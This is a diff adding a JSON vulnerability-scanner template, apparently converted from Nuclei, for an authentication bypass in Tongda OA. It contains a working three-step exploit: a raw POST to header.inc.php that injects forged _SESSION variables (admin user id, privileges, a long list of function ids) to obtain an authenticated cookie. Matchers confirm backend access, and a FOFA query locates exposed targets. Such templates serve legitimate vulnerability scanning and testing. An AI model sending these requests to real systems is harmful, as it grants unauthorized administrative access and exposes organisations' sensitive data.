@@ -1,0 +1,238 @@
+{
+  "id": "tongdaoa-auth-bypass",
+  "name": "Tongda OA - Authentication Bypass",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "Tongda OA is an OA system. The old version of header.inc.php has an authentication bypass vulnerability. An attacker can construct a malicious request to access header.inc.php, obtain the cookie, pass identity authentication, log in to the backend, perform related sensitive operations, and cause sensitive information leakage, etc.\n",
+  "references": [
+    "https://github.com/Phuong39/2022-HW-POC/blob/main/%E9%80%9A%E8%BE%BEOA%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87.md",
+    "https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/tongda-oa-2017-auth-bypass.yaml"
+  ],
+  "tags": [
+    "tongda",
+    "auth-bypass",
+    "misconfig"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "flow": "http(1) \u0026\u0026 http(2) \u0026\u0026 http(3)",
+  "searchQueries": {
+    "fofa": "app\u003d\"TDXK-通达OA\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /general/index.php HTTP/1.1\nHost: {{Hostname}}\n\n"
+      ],
+      "unsafe": true,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200 \u0026\u0026 contains(body,\"\u003ctitle\u003e用户未登录\u003c/title\u003e\")"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_1",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /module/retrieve_pwd/header.inc.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\n\n_SESSION[LOGIN_THEME]\u003d15\u0026_SESSION[LOGIN_USER_ID]\u003d1\u0026_SESSION[LOGIN_UID]\u003d1\u0026_SESSION[LOGIN_FUNC_STR]\u003d1,3,42,643,644,634,4,147,148,7,8,9,10,16,11,130,5,131,132,256,229,182,183,194,637,134,37,135,136,226,253,254,255,536,24,196,105,119,80,96,97,98,114,126,179,607,539,251,127,238,128,85,86,87,88,89,137,138,222,90,91,92,152,93,94,95,118,237,108,109,110,112,51,53,54,153,217,150,239,240,218,219,43,17,18,19,15,36,70,76,77,115,116,185,235,535,59,133,64,257,2,74,12,68,66,67,13,14,40,41,44,75,27,60,61,481,482,483,484,485,486,487,488,489,490,491,492,120,494,495,496,497,498,499,500,501,502,503,505,504,26,506,507,508,515,537,122,123,124,628,125,630,631,632,633,55,514,509,29,28,129,510,511,224,39,512,513,252,230,231,232,629,233,234,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,200,202,201,203,204,205,206,207,208,209,65,187,186,188,189,190,191,606,192,193,221,550,551,73,62,63,34,532,548,640,641,642,549,601,600,602,603,604,46,21,22,227,56,30,31,33,32,605,57,609,103,146,107,197,228,58,538,151,6,534,69,71,72,223,639,225,236,78,178,104,121,149,84,99,100,533,101,113,198,540,626,638,38,\u0026_SESSION[LOGIN_USER_PRIV]\u003d1\u0026_SESSION[LOGIN_USER_PRIV_OTHER]\u003d1\u0026_SESSION[LOGIN_USER_PRIV_TYPE]\u003d1\u0026_SESSION[LOGIN_NOT_VIEW_USER]\u003d0\u0026_SESSION[RETRIEVE_PWD_USER]\u003d1\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200 \u0026\u0026 contains(header, \"Set-Cookie\") \u0026\u0026 contains(header,\"PHPSESSID\")"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    },
+    {
+      "stepId": "http_2",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /general/index.php HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200 \u0026\u0026 !contains(body,\"\u003ctitle\u003e用户未登录\u003c/title\u003e\")  \u0026\u0026 contains(body,\"loginUser\")"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "tongdaoa-auth-bypass",
+    "info": {
+      "name": "Tongda OA - Authentication Bypass",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "Tongda OA is an OA system. The old version of header.inc.php has an authentication bypass vulnerability. An attacker can construct a malicious request to access header.inc.php, obtain the cookie, pass identity authentication, log in to the backend, perform related sensitive operations, and cause sensitive information leakage, etc.\n",
+      "reference": [
+        "https://github.com/Phuong39/2022-HW-POC/blob/main/%E9%80%9A%E8%BE%BEOA%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87.md",
+        "https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/tongda-oa-2017-auth-bypass.yaml"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 3,
+        "fofa_query": "app\u003d\"TDXK-通达OA\""
+      },
+      "tags": "tongda,auth-bypass,misconfig"
+    },
+    "flow": "http(1) \u0026\u0026 http(2) \u0026\u0026 http(3)",
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": true,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /general/index.php HTTP/1.1\nHost: {{Hostname}}\n\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200 \u0026\u0026 contains(body,\"\u003ctitle\u003e用户未登录\u003c/title\u003e\")"
+            ]
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /module/retrieve_pwd/header.inc.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\n\n_SESSION[LOGIN_THEME]\u003d15\u0026_SESSION[LOGIN_USER_ID]\u003d1\u0026_SESSION[LOGIN_UID]\u003d1\u0026_SESSION[LOGIN_FUNC_STR]\u003d1,3,42,643,644,634,4,147,148,7,8,9,10,16,11,130,5,131,132,256,229,182,183,194,637,134,37,135,136,226,253,254,255,536,24,196,105,119,80,96,97,98,114,126,179,607,539,251,127,238,128,85,86,87,88,89,137,138,222,90,91,92,152,93,94,95,118,237,108,109,110,112,51,53,54,153,217,150,239,240,218,219,43,17,18,19,15,36,70,76,77,115,116,185,235,535,59,133,64,257,2,74,12,68,66,67,13,14,40,41,44,75,27,60,61,481,482,483,484,485,486,487,488,489,490,491,492,120,494,495,496,497,498,499,500,501,502,503,505,504,26,506,507,508,515,537,122,123,124,628,125,630,631,632,633,55,514,509,29,28,129,510,511,224,39,512,513,252,230,231,232,629,233,234,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,200,202,201,203,204,205,206,207,208,209,65,187,186,188,189,190,191,606,192,193,221,550,551,73,62,63,34,532,548,640,641,642,549,601,600,602,603,604,46,21,22,227,56,30,31,33,32,605,57,609,103,146,107,197,228,58,538,151,6,534,69,71,72,223,639,225,236,78,178,104,121,149,84,99,100,533,101,113,198,540,626,638,38,\u0026_SESSION[LOGIN_USER_PRIV]\u003d1\u0026_SESSION[LOGIN_USER_PRIV_OTHER]\u003d1\u0026_SESSION[LOGIN_USER_PRIV_TYPE]\u003d1\u0026_SESSION[LOGIN_NOT_VIEW_USER]\u003d0\u0026_SESSION[RETRIEVE_PWD_USER]\u003d1\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200 \u0026\u0026 contains(header, \"Set-Cookie\") \u0026\u0026 contains(header,\"PHPSESSID\")"
+            ]
+          }
+        ]
+      },
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /general/index.php HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200 \u0026\u0026 !contains(body,\"\u003ctitle\u003e用户未登录\u003c/title\u003e\")  \u0026\u0026 contains(body,\"loginUser\")"
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
